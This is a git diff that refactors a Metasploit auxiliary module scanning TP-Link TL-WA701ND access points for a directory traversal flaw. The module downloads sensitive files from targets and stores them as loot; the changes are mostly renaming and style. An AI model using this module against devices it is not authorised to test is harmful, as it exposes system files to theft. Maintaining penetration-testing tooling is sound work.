@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -23,7 +20,6 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '86881' ],
           [ 'BID', '57969' ],
           [ 'EDB', '24504' ],
-          [ 'URL', 'http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-011' ]
         ],
       'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
@@ -34,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-      ], self.class)
+      ])
   end
 
   def extract_words(wordfile)
@@ -84,20 +80,20 @@ class Metasploit3 < Msf::Auxiliary
       loot = store_loot("tplink.traversal.data","text/plain",rhost, res.body,file)
       vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
 
-      if datastore['VERBOSE'] == true
+      if datastore['VERBOSE']
         vprint_good("#{rhost}:#{rport} - Response - File #{file}:")
         res.body.each_line do |line|
-          #the following is the last line of the useless response
+          # the following is the last line of the useless response
           if line.to_s =~ /\/\/--><\/SCRIPT>/
-            #setting out = true to print all of the following stuff
+            # setting out = true to print all of the following stuff
             out = true
             next
           end
           if out == true
             if line =~ /<META/ or line =~ /<Script/
-              #we are finished :)
-              #the next line is typical code from the website and nothing from us
-              #this means we can skip this stuff ...
+              # we are finished :)
+              # the next line is typical code from the website and nothing from us
+              # this means we can skip this stuff ...
               out = false
               next
             else
@@ -109,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
         end
         out = false
       end
-    elsif (res and res.code)
+    elsif res && res.code
       vprint_error("#{rhost}:#{rport} - File->#{file} not found")
     end
   end
